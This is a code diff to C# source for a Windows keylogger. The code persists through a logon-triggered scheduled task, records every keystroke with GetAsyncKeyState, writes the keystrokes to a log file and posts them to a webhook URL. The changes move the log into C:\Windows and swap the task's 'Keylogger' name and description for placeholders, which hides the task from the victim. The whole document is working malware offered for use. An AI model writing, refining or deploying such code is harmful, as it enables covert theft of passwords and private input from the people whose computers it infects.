@@ -16,7 +16,13 @@ namespace Keylogger
         static void Main(string[] args)
         {
             string webhookUrl = "YOUR-WEBHOOK-URL-HERE";
-            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\log.txt"; //You can rename log.txt to whatever you want it to be :)
+            string filePath = @"C:\Windows\logs.txt"; //Path to the log file... You can also rename the "log.txt" to whatever you want.
+
+            if (!Directory.Exists(Path.GetDirectoryName(filePath)))
+            {
+                Directory.CreateDirectory(Path.GetDirectoryName(filePath));
+            }
+
             if (!File.Exists(filePath))
             {
                 File.Create(filePath).Dispose();
@@ -27,7 +33,7 @@ namespace Keylogger
             {
                 // Create a new task definition and assign properties
                 Microsoft.Win32.TaskScheduler.TaskDefinition td = ts.NewTask();
-                td.RegistrationInfo.Description = "Keylogger";
+                td.RegistrationInfo.Description = "DESCRIPTION-GOES-HERE";
                 td.Principal.LogonType = Microsoft.Win32.TaskScheduler.TaskLogonType.InteractiveToken;
 
                 // Add a trigger that will start the task at login
@@ -40,13 +46,12 @@ namespace Keylogger
                 td.Actions.Add(action);
 
                 // Register the task in the root folder
-                ts.RootFolder.RegisterTaskDefinition("Keylogger", td);
+                ts.RootFolder.RegisterTaskDefinition("NAME-GOES-HERE", td);
             }
 
             while (true)
             {
                 StringBuilder sb = new StringBuilder();
-
                 for (int i = 0; i < 255; i++)
                 {
                     int keyState = GetAsyncKeyState(i);
@@ -60,7 +65,6 @@ namespace Keylogger
                 {
                     string data = sb.ToString();
                     data = data.Substring(0, data.Length - 2);
-
                     using (StreamWriter sw = File.AppendText(filePath))
                     {
                         sw.Write(data);
@@ -71,6 +75,7 @@ namespace Keylogger
                     request.Method = "POST";
                     request.ContentType = "application/json";
                     request.ContentLength = bytes.Length;
+
                     using (Stream stream = request.GetRequestStream())
                     {
                         stream.Write(bytes, 0, bytes.Length);
